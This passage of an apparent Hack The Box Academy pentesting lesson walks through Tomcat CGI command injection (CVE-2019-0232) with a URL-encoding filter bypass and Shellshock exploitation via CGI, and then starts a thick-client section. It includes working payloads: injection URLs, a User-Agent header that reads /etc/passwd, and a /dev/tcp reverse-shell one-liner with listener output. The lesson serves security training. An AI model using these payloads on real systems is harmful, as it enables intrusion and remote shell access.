       /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/ /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/  __  __  /<span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>_/       
       <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\\</span> <span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\/</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span>,__<span class="hljs-symbol">\ </span>     
        <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/ <span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/<span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>/      
         <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span> <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span>___/  <span class="hljs-symbol">\ </span><span class="hljs-symbol">\_</span><span class="hljs-symbol">\ </span>      
          <span class="hljs-symbol">\/</span>_/    <span class="hljs-symbol">\/</span>_/   <span class="hljs-symbol">\/</span>___/    <span class="hljs-symbol">\/</span>_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.204.227:8080/cgi/FUZZ.bat
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 200, Size: 81, Words: 14, Lines: 2, Duration: 234ms]
    * FUZZ: welcome

:: Progress: [4614/4614] :: Job [1/1] :: 226 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
</code></pre>
<p>Navigating to the discovered URL at <code>http://10.129.204.227:8080/cgi/welcome.bat</code> returns a message:</p>
<p>Code: txt</p>
<pre><code class="lang-txt">Welcome <span class="hljs-keyword">to</span> CGI, <span class="hljs-keyword">this</span> section <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> functional yet. Please <span class="hljs-keyword">return</span> <span class="hljs-keyword">to</span> home page.
</code></pre>
<hr>
<h3 id="exploitation">Exploitation</h3>
<p>As discussed above, we can exploit <code>CVE-2019-0232</code> by appending our own commands through the use of the batch command separator <code>&amp;</code>. We now have a valid CGI script path discovered during the enumeration at <code>http://10.129.204.227:8080/cgi/welcome.bat</code></p>
<p>Code: http</p>
<pre><code class="lang-http">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">204.227</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/cgi/</span>welcome.bat?&amp;dir
</code></pre>
<p>Navigating to the above URL returns the output for the <code>dir</code> batch command, however trying to run other common windows command line apps, such as <code>whoami</code> doesn&#39;t return an output.</p>
<p>Retrieve a list of environmental variables by calling the <code>set</code> command:</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-comment"># http://10.129.204.227:8080/cgi/welcome.bat?&amp;set</span>

Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
HTTP_ACCEPT_ENCODING=gzip, deflate
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_HOST=10.129.204.227:8080
HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&amp;set
REMOTE_ADDR=10.10.14.58
REMOTE_HOST=10.10.14.58
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.204.227
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
</code></pre>
<p>From the list, we can see that the <code>PATH</code> variable has been unset, so we will need to hardcode paths in requests:</p>
<p>Code: http</p>
<pre><code class="lang-http">http://10.129.204.227:8080/cgi/welcome.bat?&amp;c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\w</span>hoami.exe
</code></pre>
<p>The attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid character had been encountered. Apache Tomcat introduced a patch that utilises a regular expression to prevent the use of special characters. However, the filter can be bypassed by URL-encoding the payload.</p>
<p>Code: http</p>
<pre><code class="lang-http"><span class="hljs-attribute">http</span>://10.129.204.227:8080/cgi/welcome.bat?&amp;c<span class="hljs-number">%3</span>A<span class="hljs-number">%5</span>Cwindows<span class="hljs-number">%5</span>Csystem32<span class="hljs-number">%5</span>Cwhoami.exe
</code></pre>
<h2 id="attacking-common-gateway-interface-cgi-applications-shellshock">Attacking Common Gateway Interface (CGI) Applications - Shellshock</h2>
<hr>
<p>A <a href="https://www.w3.org/CGI/">Common Gateway Interface (CGI) </a>is used to help a web server render dynamic pages and create a customized response for the user making a request via a web application. CGI applications are primarily used to access other applications running on a web server. CGI is essentially middleware between web servers, external databases, and information sources. CGI scripts and programs are kept in the <code>/CGI-bin</code> directory on a web server and can be written in C, C++, Java, PERL, etc. CGI scripts run in the security context of the web server. They are often used for guest books, forms (such as email, feedback, registration), mailing lists, blogs, etc. These scripts are language-independent and can be written very simply to perform advanced tasks much easier than writing them using server-side programming languages.</p>
<p>CGI scripts/applications are typically used for a few reasons:</p>
<ul>
<li>If the webserver must dynamically interact with the user</li>
<li>When a user submits data to the web server by filling out a form. The CGI application would process the data and return the result to the user via the webserver</li>
</ul>
<p>A graphical depiction of how CGI works can be seen below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/cgi.gif" alt="image"></p>
<p><a href="https://www.tcl.tk/man/aolserver3.0/cgi.gif">Graphic source</a></p>
<p>Broadly, the steps are as follows:</p>
<ul>
<li>A directory is created on the web server containing the CGI scripts/applications. This directory is typically called <code>CGI-bin</code>.</li>
<li>The web application user sends a request to the server via a URL, i.e, <a href="https://acme.com/cgi-bin/newchiscript.pl">https://acme.com/cgi-bin/newchiscript.pl</a></li>
<li>The server runs the script and passed the resultant output back to the web client</li>
</ul>
<p>There are some disadvantages to using them: The CGI program starts a new process for each HTTP request which can take up a lot of server memory. A new database connection is opened each time. Data cannot be cached between page loads which reduces efficiency. However, the risks and inefficiencies outweigh the benefits, and CGI has not kept up with the times and has not evolved to work well with modern web applications. It has been superseded by faster and more secure technologies. However, as testers, we will run into web applications from time to time that still use CGI and will often see it when we encounter embedded devices during an assessment.</p>
<hr>
<h3 id="cgi-attacks">CGI Attacks</h3>
<p>Perhaps the most well-known CGI attack is exploiting the Shellshock (aka, &quot;Bash bug&quot;) vulnerability via CGI. The Shellshock vulnerability (<a href="https://nvd.nist.gov/vuln/detail/CVE-2014-6271">CVE-2014-6271</a>) was discovered in 2014, is relatively simple to exploit, and can still be found in the wild (during penetration tests) from time to time. It is a security flaw in the Bash shell (GNU Bash up until version 4.3) that can be used to execute unintentional commands using environment variables. At the time of discovery, it was a 25-year-old bug and a significant threat to companies worldwide.</p>
<hr>
<h3 id="shellshock-via-cgi">Shellshock via CGI</h3>
<p>The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly. Typically when saving a function as a variable, the shell function will stop where it is defined to end by the creator. Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable. Let&#39;s look at a simple example where we define an environment variable and include a malicious command afterward.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">$ <span class="hljs-keyword">env</span> y=<span class="hljs-string">'() { :;}; echo vulnerable-shellshock'</span> bash -c <span class="hljs-string">"echo not vulnerable"</span>
</code></pre>
<p>When the above variable is assigned, Bash will interpret the <code>y=&#39;() { :;};&#39;</code> portion as a function definition for a variable <code>y</code>. The function does nothing but returns an exit code <code>0</code>, but when it is imported, it will execute the command <code>echo vulnerable-shellshock</code> if the version of Bash is vulnerable. This (or any other command, such as a reverse shell one-liner) will be run in the context of the web server user. Most of the time, this will be a user such as <code>www-data</code>, and we will have access to the system but still need to escalate privileges. Occasionally we will get really lucky and gain access as the <code>root</code> user if the web server is running in an elevated context.</p>
<p>If the system is not vulnerable, only <code>&quot;not vulnerable&quot;</code> will be printed.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">$ env y='() { :;}; <span class="hljs-built_in">echo</span> vulnerable-shellshock' bash -c "<span class="hljs-built_in">echo</span> <span class="hljs-keyword">not</span> vulnerable"

<span class="hljs-keyword">not</span> vulnerable
</code></pre>
<p>This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret <code>y=() {...}</code> as a function definition. But rather, function definitions within environment variables must not be prefixed with <code>BASH_FUNC_</code>.</p>
<hr>
<h3 id="hands-on-example">Hands-on Example</h3>
<p>Let&#39;s look at a hands-on example to see how we, as pentesters, can find and exploit this flaw.</p>
<p><strong>Enumeration - Gobuster</strong></p>
<p>We can hunt for CGI scripts using a tool such as <code>Gobuster</code>. Here we find one, <code>access.cgi</code>.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ gobuster dir -u http:/</span><span class="hljs-regexp">/10.129.204.231/</span>cgi-bin<span class="hljs-regexp">/ -w /</span>usr<span class="hljs-regexp">/share/</span>wordlists<span class="hljs-regexp">/dirb/</span>small.txt -x cgi

===============================================================
Gobuster v3<span class="hljs-number">.1</span><span class="hljs-number">.0</span>
by OJ Reeves (<span class="hljs-meta">@TheColonial</span>) &amp; Christian Mehlmauer (<span class="hljs-meta">@firefart</span>)
===============================================================
[+] <span class="hljs-string">Url:</span>                     <span class="hljs-string">http:</span><span class="hljs-comment">//10.129.204.231/cgi-bin/</span>
[+] <span class="hljs-string">Method:</span>                  GET
[+] <span class="hljs-string">Threads:</span>                 <span class="hljs-number">10</span>
[+] <span class="hljs-string">Wordlist:</span>                <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>dirb/small.txt
[+] Negative Status <span class="hljs-string">codes:</span>   <span class="hljs-number">404</span>
[+] User <span class="hljs-string">Agent:</span>              gobuster/<span class="hljs-number">3.1</span><span class="hljs-number">.0</span>
[+] <span class="hljs-string">Extensions:</span>              cgi
[+] <span class="hljs-string">Timeout:</span>                 <span class="hljs-number">10</span>s
===============================================================
<span class="hljs-number">2023</span><span class="hljs-regexp">/03/</span><span class="hljs-number">23</span> <span class="hljs-number">09</span>:<span class="hljs-number">26</span>:<span class="hljs-number">04</span> Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode
===============================================================
/access.cgi           (<span class="hljs-string">Status:</span> <span class="hljs-number">200</span>) [<span class="hljs-string">Size:</span> <span class="hljs-number">0</span>]

===============================================================
<span class="hljs-number">2023</span><span class="hljs-regexp">/03/</span><span class="hljs-number">23</span> <span class="hljs-number">09</span>:<span class="hljs-number">26</span>:<span class="hljs-number">29</span> Finished
</code></pre>
<p>Next, we can cURL the script and notice that nothing is output to us, so perhaps it is a defunct script but still worth exploring further.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -i http:/</span><span class="hljs-regexp">/10.129.204.231/</span>cgi-bin/access.cgi

HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK
<span class="hljs-string">Date:</span> Thu, <span class="hljs-number">23</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">13</span>:<span class="hljs-number">28</span>:<span class="hljs-number">55</span> GMT
<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)
Content-<span class="hljs-string">Length:</span> <span class="hljs-number">0</span>
Content-<span class="hljs-string">Type:</span> text/html
</code></pre>
<p><strong>Confirming the Vulnerability</strong></p>
<p>To check for the vulnerability, we can use a simple <code>cURL</code> command or use Burp Suite Repeater or Intruder to fuzz the user-agent field. Here we can see that the contents of the <code>/etc/passwd</code> file are returned to us, thus confirming the vulnerability via the user-agent field.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin</span><span class="hljs-regexp">/cat /etc</span><span class="hljs-regexp">/passwd' bash -s :'' http:/</span><span class="hljs-regexp">/10.129.204.231/cgi</span>-bin/access.cgi

<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sys:</span><span class="hljs-symbol">x:</span><span class="hljs-number">3</span><span class="hljs-symbol">:</span><span class="hljs-number">3</span><span class="hljs-symbol">:sys</span><span class="hljs-symbol">:/dev</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/bin/sync</span>
<span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">60</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">man:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:man</span><span class="hljs-symbol">:/var/cache/man</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">8</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">9</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/var/spool/news</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">proxy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:proxy</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
www-<span class="hljs-symbol">data:</span><span class="hljs-symbol">x:</span><span class="hljs-number">33</span><span class="hljs-symbol">:</span><span class="hljs-number">33</span><span class="hljs-symbol">:www-data</span><span class="hljs-symbol">:/var/www</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">backup:</span><span class="hljs-symbol">x:</span><span class="hljs-number">34</span><span class="hljs-symbol">:</span><span class="hljs-number">34</span><span class="hljs-symbol">:backup</span><span class="hljs-symbol">:/var/backups</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">list:</span><span class="hljs-symbol">x:</span><span class="hljs-number">38</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:Mailing</span> List <span class="hljs-symbol">Manager:</span>/var/<span class="hljs-symbol">list:</span>/usr/sbin/nologin
<span class="hljs-symbol">irc:</span><span class="hljs-symbol">x:</span><span class="hljs-number">39</span><span class="hljs-symbol">:</span><span class="hljs-number">39</span><span class="hljs-symbol">:ircd</span><span class="hljs-symbol">:/var/run/ircd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">gnats:</span><span class="hljs-symbol">x:</span><span class="hljs-number">41</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span><span class="hljs-symbol">:Gnats</span> Bug-Reporting System (admin)<span class="hljs-symbol">:/var/lib/gnats</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">network:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:systemd</span> Network Management,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">resolve:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">103</span><span class="hljs-symbol">:systemd</span> Resolver,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">timesync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:systemd</span> Time Synchronization,,,<span class="hljs-symbol">:/run/systemd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">syslog:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/syslog</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">_apt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">105</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">tss:</span><span class="hljs-symbol">x:</span><span class="hljs-number">106</span><span class="hljs-symbol">:</span><span class="hljs-number">111</span><span class="hljs-symbol">:TPM</span> software stack,,,<span class="hljs-symbol">:/var/lib/tpm</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">uuidd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">107</span><span class="hljs-symbol">:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/uuidd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">tcpdump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">108</span><span class="hljs-symbol">:</span><span class="hljs-number">113</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/nonexistent</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">landscape:</span><span class="hljs-symbol">x:</span><span class="hljs-number">109</span><span class="hljs-symbol">:</span><span class="hljs-number">115</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/landscape</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">pollinate:</span><span class="hljs-symbol">x:</span><span class="hljs-number">110</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/cache/pollinate</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">111</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/run/sshd</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
systemd-<span class="hljs-symbol">coredump:</span><span class="hljs-symbol">x:</span><span class="hljs-number">999</span><span class="hljs-symbol">:</span><span class="hljs-number">999</span><span class="hljs-symbol">:systemd</span> Core <span class="hljs-symbol">Dumper:</span>/<span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">lxd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">998</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/snap/lxd/common/lxd</span><span class="hljs-symbol">:/bin/false</span>
<span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">112</span><span class="hljs-symbol">:</span><span class="hljs-number">119</span><span class="hljs-symbol">:ftp</span> daemon,,,<span class="hljs-symbol">:/srv/ftp</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
<span class="hljs-symbol">kim:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/kim</span><span class="hljs-symbol">:/bin/bash</span>
</code></pre>
<p><strong>Exploitation to Reverse Shell Access</strong></p>
<p>Once the vulnerability has been confirmed, we can obtain reverse shell access in many ways. In this example, we use a simple Bash one-liner and get a callback on our Netcat listener.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -H 'User-Agent: () { :; }; /</span>bin<span class="hljs-regexp">/bash -i &gt;&amp; /</span>dev<span class="hljs-regexp">/tcp/</span><span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.38</span><span class="hljs-regexp">/7777 0&gt;&amp;1' http:/</span><span class="hljs-regexp">/10.129.204.231/</span>cgi-bin/access.cgi
</code></pre>
<p>From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.</p>
<p>Attacking Common Gateway Interface (CGI) Applications - Shellshock</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
bash: cannot <span class="hljs-keyword">set</span> terminal process <span class="hljs-keyword">group</span> (<span class="hljs-number">938</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
bash: <span class="hljs-keyword">no</span> job control <span class="hljs-keyword">in</span> this shell
www-<span class="hljs-keyword">data</span>@htb:/usr/lib/cgi-<span class="hljs-keyword">bin</span>$ <span class="hljs-keyword">id</span>
<span class="hljs-keyword">id</span>
uid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) gid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) <span class="hljs-keyword">groups</span>=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>)
www-<span class="hljs-keyword">data</span>@htb:/usr/lib/cgi-<span class="hljs-keyword">bin</span>$
</code></pre>
<hr>
<h3 id="mitigation">Mitigation</h3>
<p>This <a href="https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability">blog post</a> contains useful tips for mitigating the Shellshock vulnerability. The quickest way to remediate the vulnerability is to update the version of Bash on the affected system. This can be trickier on end-of-life Ubuntu/Debian systems, so a sysadmin may have first to upgrade the package manager. With certain systems (i.e., IoT devices that use CGI), upgrading may not be possible. In these cases, it would be best first to ensure the system is not exposed to the internet and then evaluate if the host can be decommissioned. If it is a critical host and the organization chooses to accept the risk, a temporary workaround could be firewalling off the host on the internal network as best as possible. Keep in mind that this is just putting a bandaid on a large wound, and the best course of action would be upgrading or taking the host offline.</p>
<hr>
<h3 id="closing-thoughts">Closing Thoughts</h3>
<p>Shellshock is a legacy vulnerability that is now nearly a decade old. But just because of its age, that does not mean we will not run into it occasionally. If you come across any web applications using CGI scripts during your assessments (especially IoT devices), it is definitely worth digging into using the steps shown in this section. You may have a relatively simple foothold awaiting you!</p>
<h2 id="attacking-thick-client-applications">Attacking Thick Client Applications</h2>
<hr>
<p>Thick client applications are the applications that are installed locally on our computers. Unlike thin client applications that run on a remote server and can be accessed through the web browser, these applications do not require internet access to run, and they perform better in processing power, memory, and storage capacity. Thick client applications are usually applications used in enterprise environments created to serve specific purposes. Such applications include project management systems, customer relationship management systems, inventory management tools, and other productivity software. These applications are usually developed using Java, C++, .NET, or Microsoft Silverlight.</p>
<p>A critical security measure that, for example, <code>Java</code> has is a technology called <code>sandbox</code>. The sandbox is a virtual environment that allows untrusted code, such as code downloaded from the internet, to run safely on a user&#39;s system without posing a security risk. In addition, it isolates untrusted code, preventing it from accessing or modifying system resources and other applications without proper authorization. Besides that, there are also <code>Java API restrictions</code> and <code>Code Signing</code> that helps to create a more secure environment.</p>
<p>In a <code>.NET</code> environment, a <code>thick client</code>, also known as a <code>rich</code> client or <code>fat</code> client, refers to an application that performs a significant amount of processing on the client side rather than relying solely on the server for all processing tasks. As a result, thick clients can provide a better performance, more features, and improved user experiences compared to their <code>thin client</code> counterparts, which rely heavily on the server for processing and data storage.</p>
<p>Some examples of thick client applications are web browsers, media players, chatting software, and video games. Some thick client applications are usually available to purchase or download for free through their official website or third-party application stores, while other custom applications that have been created for a specific company, can be delivered directly from the IT department that has developed the software. Deploying and maintaining thick client applications can be more difficult than thin client applications since patches and updates must be done locally to the user&#39;s computer. Some characteristics of thick client applications are:</p>
<ul>
<li>Independent software.</li>
<li>Working without internet access.</li>
<li>Storing data locally.</li>
<li>Less secure.</li>
<li>Consuming more resources.</li>
<li>More expensive.</li>
</ul>
<p>Thick client applications can be categorized into two-tier and three-tier architecture. In two-tier architecture, the application is installed locally on the computer and communicates directly with the database. In the three-tier architecture, applications are also installed locally on the computer, but in order to interact with the databases, they first communicate with an application server, usually using the HTTP/HTTPS protocol. In this case, the application server and the database might be located on the same network or over the internet. This is something that makes three-tier architecture more secure since attackers won&#39;t be able to communicate directly with the database. The image below shows the differences between two-tier and three-tier architecture applications.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/thick\_clients/arch\_tiers.png" alt="arch\_tiers"></p>
<p>Since a large portion of thick client applications are downloaded from the internet, there is no sufficient way to ensure that users will download the official application, and that raises security concerns. Web-specific vulnerabilities like XSS, CSRF, and Clickjacking, do not apply to thick client applications. However, thick client applications are considered less secure than web applications with many attacks being applicable, including:</p>
<ul>
<li>Improper Error Handling.</li>
<li>Hardcoded sensitive data.</li>
<li>DLL Hijacking.</li>
<li>Buffer Overflow.</li>
<li>SQL Injection.</li>
<li>Insecure Storage.</li>
<li>Session Management.</li>
</ul>
<hr>
<h3 id="penetration-testing-steps">Penetration Testing Steps</h3>
<p>Thick client applications are considered more complex than others, and the attacking surface can be large. Thick client application penetration testing can be done both using automated tools and manually. The following steps are usually followed when testing thick client applications.</p>
<p><strong>Information Gathering</strong></p>
<p>In this step, penetration testers have to identify the application architecture, the programming languages and frameworks that have been used, and understand how the application and the infrastructure work. They should also need to identify technologies that are used on the client and server sides and find entry points and user inputs. Testers should also look for identifying common vulnerabilities like the ones we mentioned earlier at the end of the <a href="https://academy.hackthebox.com/module/113/section/2139##About">About</a> section. The following tools will help us gather information.</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://ntcore.com/?page\_id=388">CFF Explorer</a></td>
<td><a href="https://github.com/horsicq/Detect-It-Easy">Detect It Easy</a></td>
